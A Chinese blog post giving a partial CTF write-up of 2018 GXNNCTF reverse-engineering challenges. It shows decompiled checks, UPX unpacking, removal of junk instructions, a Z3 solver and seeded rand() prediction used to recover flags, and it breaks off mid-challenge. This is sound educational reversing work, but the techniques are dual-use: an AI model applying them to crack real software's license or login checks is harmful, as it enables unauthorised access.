<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content>
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        2018XNNCTF部分WP - 萝卜
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
     你若盛开，清风自来！ 
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar radius">
            <img src="/img/avatar.jpg">
        </div>
        <div class="name">
            萝卜
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li>
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>HOME</span>
                </a>
            </li>
            <li>
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>TAGS</span>
                </a>
            </li>
            <li>
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>ARCHIVES</span>
                </a>
            </li>
            <li>
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>ABOUT</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>SEARCH</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMC"><span class="toc-text">SMC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#USBKey-Crack"><span class="toc-text">USBKey Crack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solving"><span class="toc-text">solving</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#debug"><span class="toc-text">debug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn-x64"><span class="toc-text">pwn_x64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#format"><span class="toc-text">format</span></a></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input">
            <span id="begin-search">search</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> 你若盛开，清风自来！ </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        2018XNNCTF部分WP
    </div>

    <div class="post-meta">
        <span class="attr">Post：<span>2018-12-21 20:02:28</span></span>
        
        <span class="attr">Tags：/
        
        <a class="tag" href="/tags/#WP" title="WP">WP</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
</span>

    </div>
    <div class="post-content no-indent">
        <p>膜kaller！！！<br><a id="more"></a><br>这次比赛做出了一个pwn和一个逆向，赛后对没做出来的题又做了一遍，深刻的感受到没耐心是做不出来的！</p>
<h3 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h3><ol>
<li>PEID查壳发现存在UPX，用脱壳机脱壳</li>
<li>查看引用的字符串发现有“BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/<br>”字样，说明改程序十有八九的引用了base64算法</li>
<li>进入主函数中：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v3; // esi</span><br><span class="line">  char *v4; // eax</span><br><span class="line">  signed int v5; // edi</span><br><span class="line">  int result; // eax</span><br><span class="line">  int v7; // [esp+8h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v3 = (const char *)malloc(0x1Eu);</span><br><span class="line">  print(aWelcomeToGxnnc);</span><br><span class="line">  print(aINeedYouToProv);</span><br><span class="line">  scanf(aS, v3);</span><br><span class="line">  if ( strlen(v3) == 29 ) 						//限制flag的长度位29位</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v3[28] == &apos;&#125;&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = 0;</span><br><span class="line">      v4 = (char *)v3;</span><br><span class="line">      v5 = 8;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        if ( (*v4 ^ dword_40803C[(signed int)&amp;v4[3 - (_DWORD)v3] % 8]) == v4[aMwwCTw - v3] )</span><br><span class="line">          ++v7;</span><br><span class="line">        ++v4;</span><br><span class="line">        --v5;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v5 );</span><br><span class="line">      if ( v7 == 8 )</span><br><span class="line">        sub_401170((int)v3);</span><br><span class="line">      else</span><br><span class="line">        print(aHereIsGxnnctf);</span><br><span class="line">      result = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      print(aUnlikeFlag);</span><br><span class="line">      result = 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    print(aUnlikeFlag_0);</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li><p>改程序中将flag字符串分成了4个部分分别进行判断，第一部分则是在main函数中：判断的是前8位；将前八位处理过后与“mww_c`tw”相比较，我们可以逆推出来flag的前八位是“gxnnctf{”</p>
</li>
<li><p>当第一分部正确的话，进入 sub_401170中：</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_401170(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed int v1; // eax</span><br><span class="line">  int v2; // esi</span><br><span class="line">  int *v3; // ecx</span><br><span class="line">  int result; // eax</span><br><span class="line">  int v5; // [esp+8h] [ebp-14h]</span><br><span class="line">  int v6; // [esp+Ch] [ebp-10h]</span><br><span class="line">  int v7; // [esp+10h] [ebp-Ch]</span><br><span class="line">  int v8; // [esp+14h] [ebp-8h]</span><br><span class="line">  int v9; // [esp+18h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v1 = 8;</span><br><span class="line">  v2 = 0;</span><br><span class="line">  v5 = 61;</span><br><span class="line">  v6 = 11;</span><br><span class="line">  v7 = 95;</span><br><span class="line">  v8 = 8;</span><br><span class="line">  v9 = 67;</span><br><span class="line">  v3 = &amp;v5;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (*v3 ^ *(v1 + a1)) == 110 )</span><br><span class="line">      ++v2;</span><br><span class="line">    ++v1;</span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v1 &lt; 13 );</span><br><span class="line">  if ( v2 == 5 )</span><br><span class="line">    result = sub_401070(a1);</span><br><span class="line">  else</span><br><span class="line">    result = print(aWrongIDonotWan);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>再处理接着的5位，逆推出来是“Se1f-”</p>
</li>
<li><p>正确的话进入sub_401070:</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_401070(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  char *v1; // eax</span><br><span class="line">  int v2; // esi</span><br><span class="line">  char v3; // cl</span><br><span class="line">  int v4; // edx</span><br><span class="line">  int v5; // eax</span><br><span class="line">  int v6; // ecx</span><br><span class="line">  int v7; // ebx</span><br><span class="line">  int v8; // ecx</span><br><span class="line">  signed int v9; // eax</span><br><span class="line">  int result; // eax</span><br><span class="line">  int v11; // [esp+14h] [ebp-20h]</span><br><span class="line">  int v12; // [esp+18h] [ebp-1Ch]</span><br><span class="line">  int v13; // [esp+1Ch] [ebp-18h]</span><br><span class="line">  char v14; // [esp+20h] [ebp-14h]</span><br><span class="line">  char v15[16]; // [esp+24h] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  v11 = dword_4080F8;</span><br><span class="line">  v14 = byte_408104;</span><br><span class="line">  v12 = dword_4080FC;</span><br><span class="line">  v13 = dword_408100;</span><br><span class="line">  v1 = v15;</span><br><span class="line">  v2 = a1 + 14;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *(v2 - 1);</span><br><span class="line">    v4 = *(v2 - 1);</span><br><span class="line">    v5 = (v1 + 1);</span><br><span class="line">    v2 += 3;</span><br><span class="line">    *(v5 - 1) = byte_40805C[(v4 &gt;&gt; 2) &amp; 0x3F];</span><br><span class="line">    LOBYTE(v4) = *(v2 - 3);</span><br><span class="line">    *(++v5 - 1) = byte_40805C[(*(v2 - 3) &gt;&gt; 4) &amp; 0xF | 16 * (v3 &amp; 3)];</span><br><span class="line">    v6 = *(v2 - 2);</span><br><span class="line">    v7 = v6;</span><br><span class="line">    LOBYTE(v6) = byte_40805C[v6 &amp; 0x3F];</span><br><span class="line">    v1 = (v5 + 2);</span><br><span class="line">    *(v1 - 2) = byte_40805C[4 * (v4 &amp; 0xF) | (v7 &gt;&gt; 6) &amp; 3];</span><br><span class="line">    *(v1 - 1) = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( -14 - a1 + v2 &lt; 9 );</span><br><span class="line">  v8 = 0;</span><br><span class="line">  v9 = 0;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(&amp;v11 + v9) == v15[v9] )</span><br><span class="line">      ++v8;</span><br><span class="line">    ++v9;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v9 &lt; 12 );</span><br><span class="line">  if ( v8 == 12 )</span><br><span class="line">    result = sub_401000(a1);</span><br><span class="line">  else</span><br><span class="line">    result = print(aWrongIDonotWan);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>发现这个算法是base64的算法：加密后的字符串是“TTBkaWZ5aW5n”，直接base64解密得出“M0difying”</p>
</li>
<li><p>接着进入sub_401000：</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">signed int __cdecl sub_401000(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed int result; // eax</span><br><span class="line">  int v2; // esi</span><br><span class="line">  int v3; // [esp+Ch] [ebp-8h]</span><br><span class="line">  __int16 v4; // [esp+10h] [ebp-4h]</span><br><span class="line">  char v5; // [esp+12h] [ebp-2h]</span><br><span class="line"></span><br><span class="line">  v3 = dword_4080C4;</span><br><span class="line">  v4 = word_4080C8;</span><br><span class="line">  result = 22;</span><br><span class="line">  v2 = 0;</span><br><span class="line">  v5 = byte_4080CA;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(result + a1) + 2 == *(&amp;v3 + result - 22) )</span><br><span class="line">      ++v2;</span><br><span class="line">    ++result;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( result &lt; 28 );</span><br><span class="line">  if ( v2 == 6 )</span><br><span class="line">    result = print(aCongragulation);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>检查后七位，算法也不难，逆推出来：“_c0de!}”</li>
</ol>
<p>拼接一起得出整个flag：gxnnctf{Se1f-M0difying_c0de!}</p>
<h3 id="USBKey-Crack"><a href="#USBKey-Crack" class="headerlink" title="USBKey Crack"></a>USBKey Crack</h3><p>这个直接给我整蒙圈了，第一次见这种形式的，赛后想了想，题目给出了一个dll文件，dll文件也就能提供一些函数，碰巧这两天也在学习PE文件结构，dll文件提供的函数也就是dll中输出表的函数了，知道了要分析的方向就好办了</p>
<p>通过分析dll文件，发现文件中sub_10009550中存在登录过程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">v13 = (OLECHAR *)a2;</span><br><span class="line">*(_DWORD *)Str2 = 4456504;</span><br><span class="line">v15 = 5374058;</span><br><span class="line">v16 = 5505093;</span><br><span class="line">v17 = 6946865;</span><br><span class="line">v18 = 4980805;</span><br><span class="line">v19 = 4391023;</span><br><span class="line">v20 = 4915314;</span><br><span class="line">v21 = 7733346;</span><br><span class="line">v22 = 7733330;</span><br><span class="line">v23 = 5046351;</span><br><span class="line">v24 = 6881401;</span><br><span class="line">v25 = 7864442;</span><br><span class="line">v3 = (const WCHAR ***)sub_10004CD0(a3);</span><br><span class="line">if ( *v3 )</span><br><span class="line">  v4 = **v3;</span><br><span class="line">else</span><br><span class="line">  v4 = 0;</span><br><span class="line">v5 = *(const WCHAR ***)sub_10004CD0(v13);</span><br><span class="line">if ( v5 )</span><br><span class="line">  v6 = *v5;</span><br><span class="line">else</span><br><span class="line">  v6 = 0;</span><br><span class="line">v7 = !StrCmpW(v6, L&quot;admin&quot;) &amp;&amp; !StrCmpNW(v4, Str2, 24);</span><br></pre></td></tr></table></figure>
<p>查看交叉引用发现sub_100091B0，跟进发现flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v43 = &apos;l\0f&apos;;</span><br><span class="line">v44 = &apos;g\0a&apos;;</span><br><span class="line">v45 = &apos;T\0&#123;&apos;;</span><br><span class="line">v46 = &apos;a\0h&apos;;</span><br><span class="line">v47 = &apos;_\0t&apos;;</span><br><span class="line">v48 = &apos;s\0i&apos;;</span><br><span class="line">v49 = &apos;A\0_&apos;;</span><br><span class="line">v50 = &apos;_\0n&apos;;</span><br><span class="line">v51 = &apos;w\0A&apos;;</span><br><span class="line">v52 = &apos;0\0s&apos;;</span><br><span class="line">v53 = &apos;e\0m&apos;;</span><br><span class="line">v54 = &apos;L\0_&apos;;</span><br><span class="line">v55 = &apos;f\0i&apos;;</span><br><span class="line">v56 = &apos;&#125;\0e&apos;;</span><br></pre></td></tr></table></figure>
<p>flag：flag{That_is_An_Aws0me_Life}</p>
<h3 id="solving"><a href="#solving" class="headerlink" title="solving"></a>solving</h3><p>拿到这道题的时候发现运行不了，还有一道debug也运行不了，心态直接爆炸，赛后看WP上写到，这个题是加了花指令，导致程序运行不了和不能够正常的载入IDA中。</p>
<p>首先得想办法把花指令给去掉:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">file = open(&quot;./solving&quot;,&quot;rb&quot;)</span><br><span class="line">file2 = open(&quot;./dump&quot;,&quot;wb&quot;)</span><br><span class="line">fd = file.read()</span><br><span class="line">for i in xrange(len(fd)):</span><br><span class="line">	if i &gt;=0x7e0+30 and i&lt;0x1470:</span><br><span class="line">		if (i-(0x7e0+30))%31==0:</span><br><span class="line">			continue</span><br><span class="line">			#print hex(ord(fd[i]))</span><br><span class="line">	file2.write(fd[i])</span><br></pre></td></tr></table></figure>
<ol>
<li>然后拖入IDA中发现解析正常，在主函数中主要处理函数：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sub_400931(v9);</span><br><span class="line">sub_400971(v9);</span><br><span class="line">sub_400A22(v9);</span><br><span class="line">sub_400AA3(v9, v10);</span><br><span class="line">sub_400C93(v9, v10);</span><br></pre></td></tr></table></figure>
<p>首先是检查username：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall sub_400971(signed int *a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; // rax</span><br><span class="line">  __int64 v2; // [rsp+18h] [rbp-18h]</span><br><span class="line">  __int64 v3; // [rsp+20h] [rbp-10h]</span><br><span class="line">  __int64 v4; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = *a1;</span><br><span class="line">  v3 = a1[1];</span><br><span class="line">  v4 = a1[2];</span><br><span class="line">  if ( v2 - v3 + v4 != 1885764216</span><br><span class="line">    || v3 + 2 * (v4 + v2) != 9380830239LL</span><br><span class="line">    || (result = 3588548026377346500LL, v3 * v4 != 3588548026377346500LL) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Wrong username or password!!!\n&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以明显的看出来是一个三元一次方程组，利用Z3将其解开：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">s = Solver()</span><br><span class="line">x = BitVec(&apos;x&apos;,64)</span><br><span class="line">y = BitVec(&apos;y&apos;,64)</span><br><span class="line">z = BitVec(&apos;z&apos;,64)</span><br><span class="line">s.add(x-y+z==0x70667A78)</span><br><span class="line">s.add(y+2*(x+z)==0x22F241C1F)</span><br><span class="line">s.add(y*z==0x31CD156AC3A69DC4)</span><br><span class="line"></span><br><span class="line">if s.check()==sat:</span><br><span class="line">	a=s.model()</span><br><span class="line">	print a</span><br><span class="line">else:</span><br><span class="line">	print &quot;NO result!&quot;</span><br></pre></td></tr></table></figure></p>
<p>解出来得：[z = 1919248500, y = 1869767269, x = 1836282985]，进而逆推处username：itsmebrother</p>
<p>然后检查password：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_400AA3(_DWORD *a1, _DWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // ST1C_4</span><br><span class="line">  int v3; // ST20_4</span><br><span class="line">  int v4; // ST24_4</span><br><span class="line">  int v5; // ST28_4</span><br><span class="line">  int v6; // ST2C_4</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  int i; // [rsp+18h] [rbp-28h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; *((_BYTE *)a2 + i); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (*((_BYTE *)a2 + i) &lt;= 96 || *((_BYTE *)a2 + i) &gt; 122)</span><br><span class="line">      &amp;&amp; (*((_BYTE *)a2 + i) &lt;= 64 || *((_BYTE *)a2 + i) &gt; 90)</span><br><span class="line">      &amp;&amp; (*((_BYTE *)a2 + i) &lt;= 47 || *((_BYTE *)a2 + i) &gt; 57) )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Wrong username or password!!!\n&quot;);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  srand(a1[1] + *a1 + a1[2]);</span><br><span class="line">  v2 = *a2;</span><br><span class="line">  if ( v2 - rand() != 385125110 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Wrong username or password!!!\n&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = a2[1];</span><br><span class="line">  if ( v3 - rand() != 537582108 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Wrong username or password!!!\n&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = a2[2];</span><br><span class="line">  if ( v4 - rand() != 58160324 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Wrong username or password!!!\n&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = a2[3];</span><br><span class="line">  if ( v5 - rand() != 1606651445 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Wrong username or password!!!\n&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = a2[4];</span><br><span class="line">  result = (unsigned int)(v6 - rand());</span><br><span class="line">  if ( (_DWORD)result != 183286517 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Wrong username or password!!!\n&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个运用了srand和rand，我们知道，如果srand的种子知道的话，则随机生成的随机种子也就是可以猜出来的，通过函数里可以发现这里的种子是x+y+z，进而写一个C程序将后面的rand函数生成的随机数给dump出来，这里需要注意的是，在windows和linux上一样的种子但是生成的随机数是不一样，之前是见过这种题目的，所以我们要在linux写C程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	long int a = 5625298754;</span><br><span class="line">	srand(a);</span><br><span class="line">	printf(&quot;1--&gt;%d\n&quot;,rand());</span><br><span class="line">	printf(&quot;2--&gt;%d\n&quot;,rand());</span><br><span class="line">	printf(&quot;3--&gt;%d\n&quot;,rand());</span><br><span class="line">	printf(&quot;4--&gt;%d\n&quot;,rand());</span><br><span class="line">	printf(&quot;5--&gt;%d\n&quot;,rand());</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out：</span><br><span class="line">1--&gt;1449438580</span><br><span class="line">2--&gt;675192090</span><br><span class="line">3--&gt;1860827500</span><br><span class="line">4--&gt;57655807</span><br><span class="line">5--&gt;1717275202</span><br></pre></td></tr></table></figure>
<p>进而可以将password给逆推出来，最后一个函数是根据密码输出flag：</p>
